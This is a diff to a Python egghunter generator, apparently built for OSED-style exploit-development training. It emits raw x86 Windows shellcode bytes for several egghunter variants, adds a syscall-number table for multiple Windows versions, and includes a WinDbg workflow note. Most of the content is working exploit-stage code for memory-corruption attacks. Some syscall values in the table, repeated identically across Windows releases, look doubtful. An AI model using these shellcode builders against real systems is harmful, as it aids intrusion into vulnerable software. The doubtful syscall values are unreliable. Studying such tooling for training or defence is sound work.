@@ -2,7 +2,7 @@ from __future__ import annotations
 
 from dataclasses import dataclass
 from pathlib import Path
-from typing import Callable, Iterable, Literal
+from typing import Iterable, Literal
 
 HunterKind = Literal[
     "x86_seh",
@@ -11,6 +11,34 @@ HunterKind = Literal[
     "x86_ntaccess",
     "x86_wow64_win10_ntaccess",
 ]
+
+
+SYSCALL_TABLE = {
+    "win10_x86": {
+        "NtAccessCheckAndAuditAlarm": 0x1C6,
+        "NtDisplayString": 0x43,
+    },
+    "win11_x86": {
+        "NtAccessCheckAndAuditAlarm": 0x1C6,
+        "NtDisplayString": 0x43,
+    },
+    "server2012_x86": {
+        "NtAccessCheckAndAuditAlarm": 0x02,
+        "NtDisplayString": 0x43,
+    },
+    "server2016_x86": {
+        "NtAccessCheckAndAuditAlarm": 0x1C6,
+        "NtDisplayString": 0x43,
+    },
+    "server2019_x86": {
+        "NtAccessCheckAndAuditAlarm": 0x1C6,
+        "NtDisplayString": 0x43,
+    },
+    "server2022_x86": {
+        "NtAccessCheckAndAuditAlarm": 0x1C6,
+        "NtDisplayString": 0x43,
+    },
+}
 
 
 class EgghunterError(Exception):
@@ -97,7 +125,7 @@ SPECS: dict[HunterKind, HunterSpec] = {
     "x86_wow64_win10_ntaccess": HunterSpec(
         name="Windows 10 WoW64 egghunter",
         arch="x86 (WoW64)",
-        size=39,
+        size=45,
         notes="Win10/WoW64-specific syscall path.",
     ),
 }
@@ -147,29 +175,46 @@ def build_stage2(tag: bytes, payload: bytes) -> bytes:
     return build_egg(tag) + payload
 
 
+def resolve_syscall(target: str, name: str) -> int:
+    try:
+        return SYSCALL_TABLE[target][name]
+    except KeyError as exc:
+        raise RuntimeError(f"Missing syscall for {target}:{name}") from exc
+
+
+def encode_syscall(syscall: int, badchars: bytes) -> bytes:
+    """
+    Load syscall into EAX without badchars.
+    Strategy:
+    - push/pop if small
+    - neg encoding if large
+    """
+    badchars = normalize_badchars(badchars)
+
+    if syscall <= 0x7F:
+        candidate = b"\x6a" + bytes([syscall]) + b"\x58"
+        validate_badchars(candidate, badchars)
+        return candidate
+
+    neg = (0x100000000 - syscall) & 0xFFFFFFFF
+    raw = neg.to_bytes(4, "little", signed=False)
+    if any(b in badchars for b in raw):
+        raise BadCharError("NEG encoding contains badchars")
+    return b"\xB8" + raw + b"\xF7\xD8"
+
+
 def _pack32(value: int) -> bytes:
     if not (0 <= value <= 0xFFFFFFFF):
         raise EgghunterError("32-bit value out of range")
     return value.to_bytes(4, "little", signed=False)
 
 
-def _encode_syscall_push_or_neg(syscall_id: int, excluded: bytes) -> bytes:
-    if 0 <= syscall_id <= 0x7F:
-        candidate = b"\x6a" + bytes([syscall_id]) + b"\x58"
-        validate_badchars(candidate, excluded)
-        return candidate
-
-    neg_val = (0x100000000 - syscall_id) & 0xFFFFFFFF
-    candidate = b"\xb8" + _pack32(neg_val) + b"\xf7\xd8"
-    validate_badchars(candidate, excluded)
-    return candidate
-
-
 def hunter_x86_seh(tag: bytes, excluded: bytes = b"") -> bytes:
     validate_tag(tag)
     shellcode = (
-        b"\xeb\x21\x59\xb8" + tag +
-        b"\x51\x6a\xff\x33\xdb\x64\x89\x23\x6a\x02\x59\x8b\xfb\xf3\xaf"
+        b"\xeb\x21\x59\xb8"
+        + tag
+        + b"\x51\x6a\xff\x33\xdb\x64\x89\x23\x6a\x02\x59\x8b\xfb\xf3\xaf"
         b"\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xda\xff"
         b"\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58"
         b"\x83\xc4\x10\x50\x33\xc0\xc3"
@@ -191,10 +236,10 @@ def hunter_x86_isbadreadptr(tag: bytes, isbadreadptr_addr: int, excluded: bytes 
     return shellcode
 
 
-def hunter_x86_ntaccess(tag: bytes, syscall_id: int = 0x02, excluded: bytes = b"") -> bytes:
+def hunter_x86_ntaccess(tag: bytes, syscall_id: int, excluded: bytes = b"") -> bytes:
     validate_tag(tag)
     excluded_norm = normalize_badchars(excluded)
-    syscall_load = _encode_syscall_push_or_neg(syscall_id, excluded_norm)
+    syscall_load = encode_syscall(syscall_id, excluded_norm)
 
     shellcode = (
         b"\x66\x81\xca\xff\x0f"
@@ -215,24 +260,16 @@ def hunter_x86_ntaccess(tag: bytes, syscall_id: int = 0x02, excluded: bytes = b"
         raise EgghunterError("Unexpected syscall loader size")
 
     shellcode += b"\xb8" + tag + b"\x89\xd7\xaf\x75"
-    if len(syscall_load) == 3:
-        shellcode += b"\xea"
-    else:
-        shellcode += b"\xe6"
-
+    shellcode += b"\xea" if len(syscall_load) == 3 else b"\xe6"
     shellcode += b"\xaf\x75"
-    if len(syscall_load) == 3:
-        shellcode += b"\xe7"
-    else:
-        shellcode += b"\xe3"
-
+    shellcode += b"\xe7" if len(syscall_load) == 3 else b"\xe3"
     shellcode += b"\xff\xe7"
 
     validate_badchars(shellcode, excluded_norm)
     return shellcode
 
 
-def hunter_x86_ntdisplaystring(tag: bytes, syscall_id: int = 0x43, excluded: bytes = b"") -> bytes:
+def hunter_x86_ntdisplaystring(tag: bytes, syscall_id: int, excluded: bytes = b"") -> bytes:
     return hunter_x86_ntaccess(tag=tag, syscall_id=syscall_id, excluded=excluded)
 
 
@@ -253,7 +290,9 @@ def hunter_x86_wow64_win10_ntaccess(tag: bytes, excluded: bytes = b"") -> bytes:
         b"\x5a"
         b"\x3c\x05"
         b"\x74\xe3"
-        b"\xb8" + tag + b"\x8b\xfa\xaf\x75\xde\xaf\x75\xdb\xff\xe7"
+        b"\xb8"
+        + tag
+        + b"\x8b\xfa\xaf\x75\xde\xaf\x75\xdb\xff\xe7"
     )
     validate_badchars(shellcode, excluded)
     return shellcode
@@ -266,6 +305,7 @@ def build(
     excluded: bytes | Iterable[int] = b"",
     syscall_id: int | None = None,
     isbadreadptr_addr: int | None = None,
+    target: str = "win10_x86",
 ) -> BuildResult:
     excluded_norm = normalize_badchars(excluded)
 
@@ -280,17 +320,15 @@ def build(
             excluded=excluded_norm,
         )
     elif kind == "x86_ntdisplaystring":
-        shellcode = hunter_x86_ntdisplaystring(
-            tag=tag,
-            syscall_id=0x43 if syscall_id is None else syscall_id,
-            excluded=excluded_norm,
-        )
+        sid = resolve_syscall(target, "NtDisplayString") if syscall_id is None else syscall_id
+        shellcode = hunter_x86_ntdisplaystring(tag=tag, syscall_id=sid, excluded=excluded_norm)
     elif kind == "x86_ntaccess":
-        shellcode = hunter_x86_ntaccess(
-            tag=tag,
-            syscall_id=0x02 if syscall_id is None else syscall_id,
-            excluded=excluded_norm,
+        sid = (
+            resolve_syscall(target, "NtAccessCheckAndAuditAlarm")
+            if syscall_id is None
+            else syscall_id
         )
+        shellcode = hunter_x86_ntaccess(tag=tag, syscall_id=sid, excluded=excluded_norm)
     elif kind == "x86_wow64_win10_ntaccess":
         shellcode = hunter_x86_wow64_win10_ntaccess(tag=tag, excluded=excluded_norm)
     else:
@@ -303,73 +341,104 @@ def choose_hunter(
     tag: bytes = b"W00T",
     *,
     excluded: bytes = b"",
-    max_size: int | None = None,
+    target: str = "win10_x86",
     prefer_seh: bool = False,
-    ntaccess_syscall_id: int = 0x02,
-    ntdisplaystring_syscall_id: int = 0x43,
+    debug: bool = False,
+    max_size: int | None = None,
+    ntaccess_syscall_id: int | None = None,
+    ntdisplaystring_syscall_id: int | None = None,
     isbadreadptr_addr: int | None = None,
     allow_variants: list[str] | None = None,
 ) -> HunterCandidate:
     excluded_norm = normalize_badchars(excluded)
+    errors: list[str] = []
 
-    builders: list[tuple[str, Callable[[], bytes], bool]] = [
-        (
-            "x86_ntaccess",
-            lambda: hunter_x86_ntaccess(tag=tag, syscall_id=ntaccess_syscall_id, excluded=excluded_norm),
-            True,
-        ),
-        (
-            "x86_ntdisplaystring",
-            lambda: hunter_x86_ntdisplaystring(tag=tag, syscall_id=ntdisplaystring_syscall_id, excluded=excluded_norm),
-            True,
-        ),
-        (
-            "x86_seh",
-            lambda: hunter_x86_seh(tag=tag, excluded=excluded_norm),
-            False,
-        ),
-        (
-            "x86_wow64_win10_ntaccess",
-            lambda: hunter_x86_wow64_win10_ntaccess(tag=tag, excluded=excluded_norm),
-            True,
-        ),
-    ]
+    order: list[str] = ["x86_ntaccess", "x86_ntdisplaystring", "x86_seh"]
+    if prefer_seh:
+        order = ["x86_seh", "x86_ntaccess", "x86_ntdisplaystring"]
 
     if isbadreadptr_addr is not None:
-        builders.insert(
-            0,
-            (
-                "x86_isbadreadptr",
-                lambda: hunter_x86_isbadreadptr(tag=tag, isbadreadptr_addr=isbadreadptr_addr, excluded=excluded_norm),
-                False,
-            ),
-        )
-
-    if prefer_seh:
-        builders.sort(key=lambda item: 0 if item[0] == "x86_seh" else 1)
+        order.insert(0, "x86_isbadreadptr")
 
     if allow_variants is not None:
         allowed = set(allow_variants)
-        builders = [entry for entry in builders if entry[0] in allowed]
+        order = [name for name in order if name in allowed]
 
-    errors: list[str] = []
-    for name, builder, uses_syscall in builders:
+    for variant in order:
         try:
-            shellcode = builder()
+            if variant == "x86_isbadreadptr":
+                shellcode = hunter_x86_isbadreadptr(
+                    tag=tag,
+                    isbadreadptr_addr=isbadreadptr_addr,  # type: ignore[arg-type]
+                    excluded=excluded_norm,
+                )
+                uses_syscall = False
+            elif variant == "x86_ntaccess":
+                syscall = (
+                    resolve_syscall(target, "NtAccessCheckAndAuditAlarm")
+                    if ntaccess_syscall_id is None
+                    else ntaccess_syscall_id
+                )
+                shellcode = hunter_x86_ntaccess(tag=tag, syscall_id=syscall, excluded=excluded_norm)
+                uses_syscall = True
+            elif variant == "x86_ntdisplaystring":
+                syscall = (
+                    resolve_syscall(target, "NtDisplayString")
+                    if ntdisplaystring_syscall_id is None
+                    else ntdisplaystring_syscall_id
+                )
+                shellcode = hunter_x86_ntdisplaystring(tag=tag, syscall_id=syscall, excluded=excluded_norm)
+                uses_syscall = True
+            elif variant == "x86_seh":
+                shellcode = hunter_x86_seh(tag=tag, excluded=excluded_norm)
+                uses_syscall = False
+            else:
+                raise SelectionError(f"Unknown variant: {variant}")
+
             size = len(shellcode)
             if max_size is not None and size > max_size:
-                errors.append(f"{name}: size {size} exceeds max_size={max_size}")
-                continue
+                raise SelectionError(f"size {size} exceeds max_size={max_size}")
+
             return HunterCandidate(
-                name=name,
+                name=variant,
                 shellcode=shellcode,
                 size=size,
                 uses_syscall=uses_syscall,
             )
         except Exception as exc:
-            errors.append(f"{name}: {exc}")
+            if debug:
+                print(f"[DEBUG] {variant} failed: {exc}")
+            errors.append(f"{variant}: {exc}")
 
-    raise SelectionError("No valid egghunter found. " + " | ".join(errors))
+    raise SelectionError("No valid egghunter: " + " | ".join(errors))
+
+
+def debug_hunter_info(name: str, shellcode: bytes) -> None:
+    print(f"[+] Selected: {name}")
+    print(f"[+] Size: {len(shellcode)}")
+    print(f"[+] Bytes: {shellcode.hex()}")
+
+
+def exam_workflow_note() -> str:
+    return """
+[OSED Egghunter Workflow]
+1. Find syscall in WinDbg:
+   u ntdll!NtAccessCheckAndAuditAlarm
+2. Extract:
+   mov eax, XXXXh
+3. Update table:
+   SYSCALL_TABLE["win10_x86"]["NtAccessCheckAndAuditAlarm"] = XXXX
+4. Generate hunter:
+   python -m Tools.egghunter.emit_hunter
+5. Validate in WinDbg:
+   u <addr>
+   t
+   p
+6. Confirm:
+   - no badchars
+   - correct jumps
+   - EDI points to W00TW00T
+""".strip("\n")
 
 
 class Egghunters:
@@ -392,6 +461,7 @@ class Egghunters:
         isbadreadptr_addr: int | None = None,
         excluded: bytes | Iterable[int] = b"",
         syscall_id: int | None = None,
+        target: str = "win10_x86",
     ) -> BuildResult:
         return build(
             kind=kind,
@@ -399,4 +469,5 @@ class Egghunters:
             excluded=excluded,
             syscall_id=syscall_id,
             isbadreadptr_addr=isbadreadptr_addr,
+            target=target,
         )
